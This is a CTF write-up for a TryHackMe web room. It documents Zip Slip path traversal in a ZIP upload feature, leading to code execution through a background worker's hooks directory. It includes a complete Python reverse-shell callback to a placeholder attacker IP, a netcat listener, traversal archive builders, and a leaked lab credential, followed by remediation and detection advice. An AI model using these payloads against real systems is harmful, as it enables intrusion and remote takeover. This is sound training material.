# The Hollow Shell — Technical CTF Documentation

> **Platform:** TryHackMe  
> **Event:** Hacker Holidays 2026 — Day 10  
> **Category:** Web  
> **Difficulty:** Medium  
> **Objective:** Find the flag  
> **Primary weakness:** Zip Slip / path traversal during ZIP extraction  
> **Final impact:** arbitrary file write followed by code execution through a background worker

[Official TryHackMe room](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

---

## 1. Executive Summary

The Hollow Shell is a compact web exploitation challenge built around a file-upload feature. The application accepts a ZIP archive containing a `shell.json` manifest and extracts the archive into a per-upload directory. A nearby UI note mentions a background **theme worker** that processes optional automation hooks after upload.

The decisive flaw is that archive members are extracted without preventing traversal outside the intended directory. By supplying filenames containing `../`, it is possible to write files elsewhere on the server. The write primitive is first validated with a harmless marker and then with a browser-readable CSS file. The same primitive is finally aimed at the worker's `hooks/` directory, where a Python callback is picked up and executed.

The resulting reverse shell provides access as the `roomservice` account. The challenge flag resides in `/home/roomservice/flag.txt`; the actual flag value is intentionally not reproduced here.

<div class="callout"><strong>Portfolio note.</strong> All flag values have been redacted from the documentation and the final evidence image. The technical sequence remains reproducible inside the authorized TryHackMe lab.</div>

## 2. Evidence Index

| Figure | Evidence | Purpose |
|---|---|---|
| 01 | Room cover | Scope and room identification |
| 02 | Nmap | Initial network/service discovery |
| 03 | `/upload` 405 response | Hidden POST endpoint clue |
| 04 | Page source | Credential disclosure |
| 05 | Staff dashboard | Upload and worker logic |
| 06 | Baseline shell | Upload extraction behavior |
| 07 | Marker shell | Zip Slip path traversal confirmation |
| 08 | Static write | Arbitrary file-write proof |
| 09 | Hook write | Worker execution path |
| 10 | ZIP payload | Reverse-shell archive construction |
| 11 | Listener/shell | Final access and redacted flag retrieval |

## 3. Reconnaissance

### 3.1 Service discovery

The first step is a lightweight Nmap scan against the lab target. It identifies SSH and the web application.

```bash
nmap TARGET_IP
```

![Figure 02 — Nmap reconnaissance](assets/02-recon-nmap.svg)

The observed services are:

| Port | Service | Relevance |
|---:|---|---|
| `22/tcp` | SSH | Standard remote administration surface; no direct use in the exploit chain |
| `5000/tcp` | HTTP/web application | Primary attack surface |

### 3.2 Web endpoint enumeration

Directory enumeration exposes an `/upload` endpoint. A direct browser request uses `GET`, but the endpoint returns **405 Method Not Allowed**. This is useful reconnaissance: the route exists, but the server expects a different HTTP method.

```bash
gobuster dir \
  -u http://TARGET_IP:5000 \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster_http.txt
```

![Figure 03 — 405 on /upload](assets/03-upload-method.svg)

A 405 response is more informative than a 404 here because it confirms that `/upload` is a real application route with method restrictions.

## 4. Initial Access Through Source Disclosure

### 4.1 Inspecting the login page source

The login page contains an HTML comment left in the source. The comment reveals the default staff credentials for the lab.

![Figure 04 — Source disclosure](assets/04-source-disclosure.svg)

The exposed lab credential is:

```text
username: concierge
password: StayNoticed2024!
```

This is a classic example of why credentials, debug hints, and operational notes must not be committed to client-delivered source.

### 4.2 Staff portal

Using the disclosed account opens the Shoreline Display dashboard. The page provides a ZIP upload function called **Bring a shell ashore**.

![Figure 05 — Shoreline Display dashboard](assets/05-dashboard-upload.svg)

The interface provides two important clues:

1. Each ZIP must contain a `shell.json` manifest.
2. Optional **automation hooks** are processed by a background **theme worker** shortly after upload.

The second clue is the bridge from file upload to potential code execution: a file write becomes much more valuable when another process automatically executes or imports content from a predictable directory.

## 5. Understanding the Upload Format

A minimal, valid shell can be created locally with only the manifest. This establishes how the application stores uploaded content before any exploit attempt.

```bash
mkdir shell_test && cd shell_test
printf '{"name":"test","assets":[]}' > shell.json
zip test.zip shell.json
```

![Figure 06 — Baseline shell upload](assets/06-test-upload.svg)

The application reports a new shell directory using an unpredictable identifier. The pattern suggests an extraction layout similar to:

```text
/shells/<random-id>/
```

That means the application intends each archive member to remain below its assigned extraction directory.

## 6. Vulnerability Discovery — Zip Slip

### 6.1 Why the filename matters

A ZIP archive can carry filenames containing path traversal sequences such as `../`. If the server joins an extraction root with the archive member name without first canonicalizing and validating the resulting path, the write can escape the intended directory. This class of flaw is commonly called **Zip Slip**.

The exploit is not the ZIP format itself; it is the combination of:

```text
attacker-controlled archive filename
        +
unsafe path construction
        =
arbitrary file write
```

### 6.2 Harmless marker test

The first proof is intentionally non-destructive. A ZIP member named `../marker.txt` is added with Python so that the traversal string is preserved exactly.

```python
import zipfile

with zipfile.ZipFile("slip.zip", "w") as zf:
    zf.writestr("shell.json", '{"name":"slip-test","assets":[]}')
    zf.writestr("../marker.txt", "")
```

After upload, `marker.txt` appears outside the normal per-shell directory structure. That is strong evidence that extraction is not constraining archive paths correctly.

![Figure 07 — Zip Slip marker](assets/07-zipslip-marker.svg)

### 6.3 Browser-readable proof in `static/`

A more useful confirmation writes a small CSS file into the application's static directory. CSS is a suitable test artifact because the dashboard explicitly lists `css` as an allowed asset type and the browser can fetch static content directly.

```python
import zipfile

with zipfile.ZipFile("zipslip-proof.zip", "w") as zf:
    zf.writestr("shell.json", '{"name":"zipslip-proof","assets":[]}')
    zf.writestr("../../static/zipslip-proof.css", "ZIP_SLIP_CONFIRMED")
```

The resulting browser-visible response confirms that the traversal can escape the intended extraction directory and write to a separate application path.

![Figure 08 — Static write confirmation](assets/08-zipslip-static-proof.svg)

## 7. From File Write to Code Execution

### 7.1 Following the worker clue

At this point, arbitrary file write is established. The remaining problem is execution. The dashboard specifically says that an automation worker processes hooks after a shell arrives, so the next objective is to place a controlled script inside that hook location.

The traversal target is: 

```text
../../hooks/callback.py
```

A clean upload response when targeting `hooks/callback.py`, combined with the earlier behavior of the application, is consistent with the directory existing at that depth.

![Figure 09 — Hook write path](assets/09-hook-write.svg)

### 7.2 Build the reverse-shell archive

A listener is prepared on the attack machine. The callback script connects to `LHOST` on TCP/4444 and attaches the socket to standard input, output, and error.

Listener:

```bash
nc -lvnp 4444
```

Callback payload:

```python
import socket
import os
import pty

LHOST = "YOUR_ATTACKER_IP"
PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((LHOST, PORT))

for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)

pty.spawn("/bin/bash")
```

ZIP construction:

```python
import zipfile

with zipfile.ZipFile("reverse-shell.zip", "w") as zf:
    zf.writestr("shell.json", open("shell.json").read())
    zf.writestr("../../hooks/callback.py", open("callback.py").read())
```

Validation before upload:

```bash
unzip -l reverse-shell.zip
```

![Figure 10 — Traversal payload in the ZIP](assets/10-payload-archive.svg)

> **Important operational detail:** the attacker IP must be correct **before** the archive is built. Editing `callback.py` afterward does not update the copy already embedded in the ZIP.

## 8. Shell Access and Objective Retrieval

After the malicious shell is uploaded, the background worker processes the hook and the listener receives a connection. The resulting shell runs as `roomservice`.

Basic situational checks show the home directories and then locate the target file under `/home/roomservice`.

```bash
ls -la /home
cd /home/roomservice
ls -la
cat flag.txt
```

The supplied evidence confirms the final file is present and readable. **The flag value is deliberately redacted in this repository.**

![Figure 11 — Reverse shell and redacted flag](assets/11-shell-flag-redacted.svg)

## 9. Final Attack Chain

```text
[Nmap]
   │
   ▼
[5000/tcp]
   │
   ▼
[/upload → 405]
   │
   ▼
[HTML source → staff creds]
   │
   ▼
[/dashboard]
   │
   ├── shell.json requirement
   └── theme worker clue
   │
   ▼
[Zip Slip / ../ traversal]
   │
   ├── marker write
   ├── static/ proof
   └── hooks/ target
   │
   ▼
[callback.py executed by worker]
   │
   ▼
[Reverse shell as roomservice]
   │
   ▼
[/home/roomservice/flag.txt]
```

The important analytical transition is **write primitive → execution primitive**. A path traversal bug alone may only provide file modification. Here, the application's background worker turns that capability into command execution.

## 10. Root Cause Analysis

### 10.1 Unsafe archive extraction

The application trusts archive member paths. It should instead:

1. Resolve the final destination using a canonical path.
2. Verify that the resolved destination remains beneath a dedicated extraction root.
3. Reject absolute paths and traversal attempts before writing anything.
4. Extract with a safe library or a hardened helper rather than concatenating strings manually.

### 10.2 Executable automation from an upload-controlled location

Even with safe extraction, a design where a background worker executes Python content from a directory influenced by uploads is high risk. Worker inputs should be data-only, not arbitrary code.

### 10.3 Secrets in HTML comments

The starter login credential should never be present in client-visible source. Credentials belong in secure server-side configuration or a secrets manager, not comments, JavaScript, templates, or debug pages.

## 11. Detection Opportunities

A defender could hunt for the following signals:

| Signal | Why it matters |
|---|---|
| ZIP members containing `../` or absolute paths | Strong indicator of traversal attempts |
| Extraction writes outside the expected shell directory | Indicates a broken path boundary |
| New Python files appearing in worker directories | Potential code-execution staging |
| Worker process creating outbound TCP connections | Possible reverse-shell behavior |
| Unusual child process chains from the web service | Application-layer command execution |
| Reads of `/home/roomservice/flag.txt` | Objective access pattern in the lab context |

## 12. Lessons Learned

**Enumeration:** a 405 response can reveal a real route even when the method used by a browser is rejected.

**Source review:** client-visible HTML is part of the attack surface; comments and debug leftovers can leak operational data.

**Archive security:** archive filenames must be treated as attacker-controlled paths.

**Exploit chaining:** the impact of arbitrary file write depends heavily on what consumes the written file next.

**Evidence-driven testing:** a harmless marker followed by a readable static-file proof provides a cleaner exploitation narrative than jumping straight to a reverse shell.

## 13. Reproduction Checklist

```text
[ ] Start the TryHackMe lab machine
[ ] Identify the web service on TCP/5000
[ ] Enumerate routes and observe /upload → 405
[ ] Inspect login source and authenticate to the staff portal
[ ] Build a minimal shell.json archive
[ ] Prove Zip Slip with a harmless marker
[ ] Prove arbitrary write in static/
[ ] Identify the worker's hooks/ execution path
[ ] Start a netcat listener on 4444
[ ] Embed the callback script at ../../hooks/callback.py
[ ] Upload the archive and wait for the worker
[ ] Locate /home/roomservice/flag.txt
[ ] Keep the final flag redacted in public documentation
```

## 14. References

1. [TryHackMe — The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)
2. [Supplied reference walkthrough — Crystalcascade14](https://crystalcascade14.medium.com/the-hollow-shell-9d9c1946d6f2)
3. [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

## 15. Disclaimer

This documentation describes actions performed against an intentionally vulnerable TryHackMe lab. Use the techniques only in environments where you have explicit authorization.
